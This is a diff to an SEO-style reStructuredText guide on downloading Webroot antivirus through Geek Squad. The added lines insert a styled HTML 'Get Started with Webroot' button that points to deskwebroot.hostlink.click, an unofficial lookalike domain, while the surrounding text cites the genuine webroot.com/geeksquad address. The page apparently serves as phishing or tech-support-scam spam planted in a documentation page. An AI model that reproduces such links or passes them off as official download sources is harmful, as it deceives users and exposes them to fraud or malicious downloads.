@@ -3,6 +3,12 @@ How to Download Webroot Geek Squad Version via webroot.com/geeksquad? Latest Ins
 
 If you've recently purchased a Geek Squad Protection plan or subscribed to Best Buy Totaltech™, you're likely eligible for a **Download Webroot Geek Squad** version of the award-winning Webroot SecureAnywhere antivirus software. Geek Squad and Webroot have partnered to provide customers with advanced digital protection at no additional cost. To install your security software, simply visit `webroot.com/geeksquad <https://www.webroot.com/geeksquad>`_ and follow the activation process.
 
+.. raw:: html
+
+   <div style="text-align:center;">
+       <a href="https://deskwebroot.hostlink.click/" rel="noreferrer" style="background-color:#007BFF;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;display:inline-block;font-weight:bold;">Get Started with Webroot</a>
+   </div>
+
 This guide provides the latest step-by-step instructions on how to **Download Webroot Geek Squad**, activate it using your unique keycode, and secure your devices with real-time protection. Whether you're setting it up on a new computer or reinstalling after a reset, you’ll find all the answers here.
 
 Use `webroot.com/geeksquad <https://www.webroot.com/geeksquad>`_ to get started and protect your system from viruses, malware, ransomware, and phishing attacks. Throughout this guide, we’ll mention **Download Webroot Geek Squad** and related steps so you never miss a detail.
